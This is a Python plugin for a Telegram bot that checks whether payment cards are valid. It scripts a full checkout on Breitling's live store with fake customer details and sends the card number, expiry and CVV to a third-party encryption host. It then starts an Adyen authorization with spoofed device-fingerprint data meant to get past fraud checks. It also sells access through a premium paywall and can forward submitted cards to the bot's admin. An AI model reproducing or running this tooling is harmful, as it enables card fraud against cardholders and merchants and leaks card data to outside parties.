"""
Adyen Gateway Plugin for Breitling
Commands: /ad, .ad, !ad, $ad
"""

import requests
import json
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

import sys
sys.path.append('..')
from utils.card_utils import extract_card_info, format_card_display
from utils.bin_lookup import get_bin_info
from utils.response_formatter import format_response, get_response_keyboard

# Plugin metadata
PLUGIN_INFO = {
    'name': 'Adyen',
    'commands': ['ad'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Adyen gateway via Breitling',
    'type': 'auth',
    'status': 'active'
}

class AdyenGateway:
    def __init__(self):
        self.session = requests.Session()
        self.checkout_id = None
        self.order_id = None
        
    def create_checkout(self):
        """Step 1: Create checkout"""
        url = "https://www-orders.breitling.com/graphql/"
        payload = {
            "operationName": "CheckoutCreate",
            "variables": {
                "channelSlug": "us-usd",
                "languageCode": "EN_US"
            },
            "query": "mutation CheckoutCreate($channelSlug: String!, $email: String, $languageCode: String) {\n  checkoutCreate(\n    input: {languageCode: $languageCode, email: $email, channel: $channelSlug}\n  ) {\n    checkout {\n      id\n      user {\n        email\n        __typename\n      }\n      email\n      __typename\n    }\n    errors {\n      ...Error\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Error on Error {\n  field\n  code\n  context\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://www.breitling.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.breitling.com/",
            'accept-language': "en-GB,en;q=0.9"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        data = response.json()
        
        if data.get('data', {}).get('checkoutCreate', {}).get('checkout', {}).get('id'):
            self.checkout_id = data['data']['checkoutCreate']['checkout']['id']
            return True
        return False
    
    def add_lines(self):
        """Step 2: Add items to checkout"""
        url = "https://www-orders.breitling.com/graphql/"
        payload = {
            "operationName": "CheckoutLinesAdd",
            "variables": {
                "id": self.checkout_id,
                "lines": [
                    {
                        "variantId": "UHJvZHVjdFZhcmlhbnQ6ODExMg==",
                        "metadata": [{"key": "item.cta_selected", "value": "ORDER"}]
                    }
                ]
            },
            "query": "mutation CheckoutLinesAdd($id: ID!, $lines: [CheckoutLineInput!]!) {\n  checkoutLinesAdd(id: $id, lines: $lines) {\n    errors {\n      ...Error\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Error on Error {\n  field\n  code\n  context\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.status_code == 200
    
    def update_billing_address(self):
        """Step 3: Update billing address"""
        url = "https://www-breitling.eu.saleor.cloud/graphql/"
        payload = {
            "operationName": "CheckoutBillingAddressUpdate",
            "variables": {
                "id": self.checkout_id,
                "address": {
                    "firstName": "Toop",
                    "lastName": "Taya",
                    "companyName": "",
                    "streetAddress2": "",
                    "postalCode": "35010-4666",
                    "phone": "+12016546544",
                    "streetAddress1": "18 Little New York Loop",
                    "country": "US",
                    "city": "Alexander City",
                    "countryArea": "AL",
                    "metadata": []
                }
            },
            "query": "mutation CheckoutBillingAddressUpdate($id: ID!, $address: AddressInput!, $validationRules: CheckoutAddressValidationRules) {\n  checkoutBillingAddressUpdate(\n    id: $id\n    billingAddress: $address\n    validationRules: $validationRules\n  ) {\n    checkout {\n      id\n      billingAddress {\n        ...Address\n        __typename\n      }\n      __typename\n    }\n    errors {\n      ...CheckoutError\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Address on Address {\n  id\n  city\n  cityArea\n  companyName\n  countryArea\n  firstName\n  isDefaultBillingAddress\n  isDefaultShippingAddress\n  lastName\n  phone\n  postalCode\n  streetAddress1\n  streetAddress2\n  country {\n    code\n    country\n    __typename\n  }\n  metadata {\n    key\n    value\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutError on CheckoutError {\n  field\n  code\n  addressType\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.status_code == 200
    
    def update_shipping_address(self):
        """Step 4: Update shipping address"""
        url = "https://www-orders.breitling.com/graphql/"
        payload = {
            "operationName": "CheckoutShippingAddressUpdate",
            "variables": {
                "id": self.checkout_id,
                "address": {
                    "firstName": "Toop",
                    "lastName": "Taya",
                    "companyName": "",
                    "streetAddress2": "",
                    "postalCode": "35010-4666",
                    "phone": "+12016546544",
                    "streetAddress1": "18 Little New York Loop",
                    "country": "US",
                    "city": "Alexander City",
                    "countryArea": "AL",
                    "metadata": [{"key": "saved", "value": "TRUE"}]
                }
            },
            "query": "mutation CheckoutShippingAddressUpdate($id: ID!, $address: AddressInput!, $validationRules: CheckoutAddressValidationRules) {\n  checkoutShippingAddressUpdate(\n    id: $id\n    shippingAddress: $address\n    validationRules: $validationRules\n  ) {\n    errors {\n      ...Error\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Error on Error {\n  field\n  code\n  context\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.status_code == 200
    
    def update_title_metadata(self):
        """Step 5: Update address title metadata"""
        url = "https://www-orders.breitling.com/graphql/"
        payload = {
            "operationName": "CheckoutAddressTitleMetadataUpdate",
            "variables": {
                "id": self.checkout_id,
                "shippingTitle": "Mr",
                "billingTitle": "Mr"
            },
            "query": "mutation CheckoutAddressTitleMetadataUpdate($id: ID!, $shippingTitle: String!, $billingTitle: String!) {\n  updateMetadata(\n    id: $id\n    input: [{key: \"shipping.title\", value: $shippingTitle}, {key: \"billing.title\", value: $billingTitle}]\n  ) {\n    errors {\n      ...Error\n      __typename\n    }\n    item {\n      shippingTitle: metafield(key: \"shipping.title\")\n      billingTitle: metafield(key: \"billing.title\")\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Error on Error {\n  field\n  code\n  context\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.status_code == 200
    
    def update_email(self):
        """Step 6: Update checkout email"""
        url = "https://www-breitling.eu.saleor.cloud/graphql/"
        payload = {
            "operationName": "CheckoutEmailUpdate",
            "variables": {
                "id": self.checkout_id,
                "email": "Amk@gmail.com"
            },
            "query": "mutation CheckoutEmailUpdate($id: ID!, $email: String!) {\n  checkoutEmailUpdate(checkoutId: $id, email: $email) {\n    checkout {\n      ...CheckoutBare\n      __typename\n    }\n    errors {\n      ...CheckoutError\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment CheckoutBare on Checkout {\n  id\n  user {\n    email\n    __typename\n  }\n  email\n  languageCode\n  __typename\n}\n\nfragment CheckoutError on CheckoutError {\n  field\n  code\n  addressType\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.status_code == 200
    
    def update_delivery_mode(self):
        """Step 7: Update delivery mode"""
        url = "https://www-orders.breitling.com/graphql/"
        payload = {
            "operationName": "CheckoutDeliveryModeUpdate",
            "variables": {
                "checkoutId": self.checkout_id,
                "deliveryMode": "HOME_DELIVERY",
                "boutiqueExtReference": "",
                "address": {
                    "firstName": "Toop",
                    "lastName": "Taya",
                    "companyName": "",
                    "streetAddress2": "",
                    "postalCode": "35010-4666",
                    "phone": "+12016546544",
                    "streetAddress1": "18 Little New York Loop",
                    "country": "US",
                    "city": "Alexander City",
                    "countryArea": "AL"
                }
            },
            "query": "mutation CheckoutDeliveryModeUpdate($checkoutId: ID, $orderId: ID, $deliveryMode: DeliveryMode!, $boutiqueExtReference: String, $address: AddressInput) {\n  deliveryModeUpdate(\n    checkoutId: $checkoutId\n    orderId: $orderId\n    deliveryMode: $deliveryMode\n    boutiqueExtReference: $boutiqueExtReference\n    address: $address\n  ) {\n    errors {\n      field\n      code\n      message\n      __typename\n    }\n    __typename\n  }\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.status_code == 200
    
    def create_order(self):
        """Step 8: Create order"""
        url = "https://www-orders.breitling.com/graphql/"
        payload = {
            "operationName": "OrderCreate",
            "variables": {"id": self.checkout_id},
            "query": "mutation OrderCreate($id: ID!) {\n  orderCreate(id: $id) {\n    order {\n      id\n      __typename\n    }\n    errors {\n      ...Error\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Error on Error {\n  field\n  code\n  context\n  message\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        data = response.json()
        
        if data.get('data', {}).get('orderCreate', {}).get('order', {}).get('id'):
            self.order_id = data['data']['orderCreate']['order']['id']
            return True
        return False
    
    def encrypt_card(self, card, month, year, cvv):
        """Step 9: Encrypt card details"""
        url = "https://pladixjwk.vercel.app/api/adyen"
        payload = {
            "context": "10001|97022E7DB5B3806B7A776A8D6E991A1CFCCB7DC0FA705B43815B58CFF554585E7B2579EF5D4ACC74488469DCB60AA94C09071256F9F33ACB2538F2F2594203BA0FD47BC7AAE0DC50A68F7E388A04C5AD24BD3066532AAA044FCC05218E85CA3C594FF480531975618AEDAB31DD489087F104387692D329C23E36157CD252AE7056E94285EA0D5D02FF4A4A6A93CD16340BF1949115B9C4C1454BEB4DAF01DB83232050DEFF0A37E4A48C72AE05DEC47188BC0C098460FE7AC107353D18563E7898E9C8A5CE0255B49C48742150660370AEA4A7005FF8C9031033368A7AC22037CB3F290A1E00CF789F7EA3F5EAE63F6181196510F047200B2AAB6E0B07D902F1",
            "cc": card,
            "mes": month,
            "ano": year,
            "cvv": cvv
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://pladixjwk.vercel.app",
            'referer': "https://pladixjwk.vercel.app/"
        }
        
        try:
            response = self.session.post(url, json=payload, headers=headers, timeout=10)
            data = response.json()
            
            if data.get('status'):
                return {
                    'encryptedCardNumber': data.get('encryptedCardNumber'),
                    'encryptedSecurityCode': data.get('encryptedSecurityCode'),
                    'encryptedExpiryYear': data.get('encryptedExpiryYear'),
                    'encryptedExpiryMonth': data.get('encryptedExpiryMonth')
                }
        except Exception as e:
            print(f"Encryption error: {e}")
        
        return None
    
    def process_payment(self, encrypted_data):
        """Step 10: Process payment transaction"""
        url = "https://www-breitling.eu.saleor.cloud/graphql/"
        payload = {
            "operationName": "TransactionInitialize",
            "variables": {
                "id": self.order_id,
                "amount": 613.6,
                "data": {
                    "origin": "https://www.breitling.com",
                    "returnUrl": f"https://www.breitling.com/us-en/store/checkout/payment/?order-id={self.order_id}",
                    "countryCode": "US",
                    "shopperLocale": "en-US",
                    "shopperIP": "",
                    "action": "AUTHORIZE",
                    "type": "FULL",
                    "riskData": {
                        "clientData": "eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IjFCMk0yWThBc2cwMDAwMDAwMDAwMDAwMDAweFpYZHVlSW94VzAwMDkzMDE4MDBjVkI5NGlLekJHdThBT2s1UXVmVTFCMk0yWThBc2cwMDBTMWhEWVcwY0dEMDAwMDB1RmhKRTAwMDAwaVhwblM5TW41M1JXVDFlYjg1R3U6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbIl9ycF91aWQ9M2M1Y2JkZjYtYjIxMi04MzgwLWM4NDktOGFjMGQ1M2Q4N2NiIl0sImNvbXBvbmVudHMiOnsidXNlckFnZW50IjoiMTUxZTk4YTczNzlkYzMxMGY2MGQxYjg0MDk5MjcwN2QiLCJ3ZWJkcml2ZXIiOjAsImxhbmd1YWdlIjoiZW4tR0IiLCJjb2xvckRlcHRoIjoyNCwiZGV2aWNlTWVtb3J5Ijo0LCJwaXhlbFJhdGlvIjoyLjYyNSwiaGFyZHdhcmVDb25jdXJyZW5jeSI6OCwic2NyZWVuV2lkdGgiOjkxOCwic2NyZWVuSGVpZ2h0Ijo0MTIsImF2YWlsYWJsZVNjcmVlbldpZHRoIjo5MTgsImF2YWlsYWJsZVNjcmVlbkhlaWdodCI6NDEyLCJ0aW1lem9uZU9mZnNldCI6LTE4MCwidGltZXpvbmUiOiJBZnJpY2EvTmFpcm9iaSIsInNlc3Npb25TdG9yYWdlIjoxLCJsb2NhbFN0b3JhZ2UiOjEsImluZGV4ZWREYiI6MSwiYWRkQmVoYXZpb3IiOjAsIm9wZW5EYXRhYmFzZSI6MCwicGxhdGZvcm0iOiJMaW51eCBhcm12ODEiLCJwbHVnaW5zIjoiMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAiLCJjYW52YXMiOiIwNDIxNzZjNjkxYzZmMzY3NTA1NDA1YmEyZjYxZGI1YyIsIndlYmdsIjoiNzA0MmQ1ZDgxNjBjMjNlNDg4ZjUyZDA0ODY0ZjhjZDkiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiQVJNfk1hbGktRzUyIiwiYWRCbG9jayI6MCwiaGFzTGllZExhbmd1YWdlcyI6MCwiaGFzTGllZFJlc29sdXRpb24iOjAsImhhc0xpZWRPcyI6MCwiaGFzTGllZEJyb3dzZXIiOjAsImZvbnRzIjoiMzg3NGY2N2JhYzVlZTUzYjdhOWI3YWNlODkwMGVjYWMiLCJhdWRpbyI6ImIwNTY1NjhiNzhiOWIzNDczZGU2NTI5MzY3M2RiZWY5IiwiZW51bWVyYXRlRGV2aWNlcyI6IjVmM2ZkYWY0NzQzZWFhNzA3Y2E2YjdkYTY1NjAzODkyIiwidmlzaXRlZFBhZ2VzIjpbXSwiYmF0dGVyeUluZm8iOnsiYmF0dGVyeUxldmVsIjo4OSwiYmF0dGVyeUNoYXJnaW5nIjpmYWxzZX0sImJvdERldGVjdG9ycyI6eyJ3ZWJEcml2ZXIiOmZhbHNlLCJjb29raWVFbmFibGVkIjp0cnVlLCJoZWFkbGVzc0Jyb3dzZXIiOmZhbHNlLCJub0xhbmd1YWdlcyI6ZmFsc2UsImluY29uc2lzdGVudEV2YWwiOmZhbHNlLCJpbmNvbnNpc3RlbnRQZXJtaXNzaW9ucyI6ZmFsc2UsImRvbU1hbmlwdWxhdGlvbiI6ZmFsc2UsImFwcFZlcnNpb25TdXNwaWNpb3VzIjpmYWxzZSwiZnVuY3Rpb25CaW5kU3VzcGljaW91cyI6dHJ1ZSwiYm90SW5Vc2VyQWdlbnQiOmZhbHNlLCJ3aW5kb3dTaXplU3VzcGljaW91cyI6ZmFsc2UsImJvdEluV2luZG93RXh0ZXJuYWwiOmZhbHNlLCJ3ZWJHTCI6ZmFsc2V9fX0="
                    },
                    "paymentMethod": {
                        "type": "scheme",
                        "holderName": "Tara",
                        "encryptedExpiryMonth": encrypted_data['encryptedExpiryMonth'],
                        "encryptedExpiryYear": encrypted_data['encryptedExpiryYear'],
                        "encryptedCardNumber": encrypted_data['encryptedCardNumber'],
                        "encryptedSecurityCode": encrypted_data['encryptedSecurityCode'],
                        "brand": "visa",
                        "checkoutAttemptId": "c0d1192c-86ea-4afc-8788-9c88c600026e1770663068881F6C865003431442B8E80D70F83A15A0FCCFF733B901D46F7CE6C63E78E83EE01"
                    },
                    "browserInfo": {
                        "acceptHeader": "*/*",
                        "colorDepth": 24,
                        "language": "en-GB",
                        "javaEnabled": False,
                        "screenHeight": 918,
                        "screenWidth": 412,
                        "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
                        "timeZoneOffset": -180
                    },
                    "clientStateDataIndicator": True
                },
                "gatewayId": "PRD.breitling.adyen"
            },
            "query": "mutation TransactionInitialize($data: JSON!, $amount: PositiveDecimal!, $id: ID!, $gatewayId: String!) {\n  transactionInitialize(\n    amount: $amount\n    id: $id\n    paymentGateway: {id: $gatewayId, data: $data}\n  ) {\n    transaction {\n      ...TransactionItem\n      __typename\n    }\n    data\n    errors {\n      ...TransactionInitializeError\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment TransactionItem on TransactionItem {\n  id\n  paymentData: metafield(key: \"ADYEN_APP.PAYMENT_DATA\")\n  paymentMethod: metafield(key: \"transaction.payment_method\")\n  forGiftPaymentData: metafield(key: \"4GIFT.PAYMENT_DATA\")\n  oricoFinancingAppPaymentData: metafield(key: \"ORICO_FINANCING_APP.PAYMENT_DATA\")\n  genericPaymentData: metafield(key: \"transaction.payment_data\")\n  authorizedAmount {\n    ...Money\n    __typename\n  }\n  chargedAmount {\n    ...Money\n    __typename\n  }\n  chargePendingAmount {\n    ...Money\n    __typename\n  }\n  events {\n    ...TransactionEvent\n    __typename\n  }\n  __typename\n}\n\nfragment Money on Money {\n  amount\n  currency\n  __typename\n}\n\nfragment TransactionEvent on TransactionEvent {\n  type\n  createdAt\n  pspReference\n  message\n  amount {\n    amount\n    currency\n    __typename\n  }\n  __typename\n}\n\nfragment TransactionInitializeError on TransactionInitializeError {\n  field\n  message\n  code\n  __typename\n}"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'origin': "https://www.breitling.com",
            'referer': "https://www.breitling.com/"
        }
        
        response = self.session.post(url, json=payload, headers=headers)
        return response.json()
    
    async def check_card(self, card, month, year, cvv):
        """Main function to check card through the complete flow"""
        start_time = time.time()
        
        try:
            # Execute the flow
            if not self.create_checkout():
                return None, "Failed to create checkout", time.time() - start_time
            
            if not self.add_lines():
                return None, "Failed to add items", time.time() - start_time
            
            if not self.update_billing_address():
                return None, "Failed to update billing address", time.time() - start_time
            
            if not self.update_shipping_address():
                return None, "Failed to update shipping address", time.time() - start_time
            
            if not self.update_title_metadata():
                return None, "Failed to update title metadata", time.time() - start_time
            
            if not self.update_email():
                return None, "Failed to update email", time.time() - start_time
            
            if not self.update_delivery_mode():
                return None, "Failed to update delivery mode", time.time() - start_time
            
            if not self.create_order():
                return None, "Failed to create order", time.time() - start_time
            
            # Encrypt card
            encrypted_data = self.encrypt_card(card, month, year, cvv)
            if not encrypted_data:
                return None, "Failed to encrypt card", time.time() - start_time
            
            # Process payment
            result = self.process_payment(encrypted_data)
            execution_time = time.time() - start_time
            
            return result, None, execution_time
            
        except Exception as e:
            execution_time = time.time() - start_time
            return None, f"Error: {str(e)}", execution_time

# Register command handlers
def setup(app: Client):
    """Setup function called when plugin is loaded"""
    
    @app.on_message(filters.command(["ad"], prefixes=[".", "/", "!", "$"]))
    async def ad_command(client, message):
        """Handle /ad command"""
        from utils.admin import check_banned, check_maintenance, check_gateway_access, forward_to_admin_if_enabled
        from utils.database import db
        
        user_id = message.from_user.id
        username = message.from_user.username
        
        # Add user to database
        db.add_user(user_id, username)
        
        # Check if banned
        if await check_banned(client, message):
            return
        
        # Check if maintenance
        if await check_maintenance(client, message):
            return
        
        # Check gateway access
        can_access, reason = await check_gateway_access(user_id, 'ad')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
                from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Buy", url="https://t.me/themigel")
                ]])
                await message.reply_text(
                    "<b>Only available to Premium users !</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard
                )
                return
        
        # Extract card info from message or reply
        text = None
        if message.reply_to_message:
            text = message.reply_to_message.text
        elif message.text:
            command_text = message.text.strip()
            command_parts = command_text.split(maxsplit=1)
            if len(command_parts) > 1:
                text = command_parts[1]
        
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝘼𝙙𝙮𝙚𝙣 - AUTH

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Adyen $

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ad cc|month|year|cvc"""
            await message.reply_text(resp, parse_mode=ParseMode.HTML)
            return
        
        # Extract card info
        card_info = extract_card_info(text)
        if not card_info:
            await message.reply_text("❌ Invalid card format. Use: cc|month|year|cvv")
            return
        
        # Validate card with Luhn algorithm
        from utils.gateway_middleware import validate_card_with_luhn
        if not await validate_card_with_luhn(card_info, "Adyen $", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'ad')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card
        gateway = AdyenGateway()
        result, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'ad')
        
        if error:
            # Error occurred
            bin_info = get_bin_info(card)
            response_text = format_response(
                card_info=(card, month, year, cvv),
                gateway_name="Adyen $",
                response_message=error,
                bin_info=bin_info,
                execution_time=execution_time,
                refusal_reason_raw="Error",
                result_code=None,
                merchant_advice_code=None
            )
        else:
            # Parse result - add safety checks
            try:
                data = result.get('data', {})
                if data:
                    transaction_data = data.get('transactionInitialize', {})
                    if transaction_data:
                        transaction_data_inner = transaction_data.get('data', {})
                        additional_data = transaction_data_inner.get('additionalData', {}) if transaction_data_inner else {}
                    else:
                        additional_data = {}
                else:
                    additional_data = {}
                
                refusal_reason_raw = additional_data.get('refusalReasonRaw')
                result_code = transaction_data_inner.get('resultCode') if transaction_data_inner else None
                merchant_advice_code = additional_data.get('merchantAdviceCode')
            except Exception as e:
                print(f"Error parsing Adyen response: {e}")
                refusal_reason_raw = None
                result_code = "Unknown"
                merchant_advice_code = None
            
            # Get BIN info
            bin_info = get_bin_info(card)
            
            # Format response
            response_text = format_response(
                card_info=(card, month, year, cvv),
                gateway_name="Adyen $",
                response_message=refusal_reason_raw or result_code or "Unknown",
                bin_info=bin_info,
                execution_time=execution_time,
                refusal_reason_raw=refusal_reason_raw,
                result_code=result_code,
                merchant_advice_code=merchant_advice_code
            )
        
        # Update progress message with result
        keyboard = get_response_keyboard()
        await progress_msg.edit_text(
            response_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )
    
    print("✅ Adyen gateway commands registered")

# Call setup when module is loaded
# This will be called by the plugin loader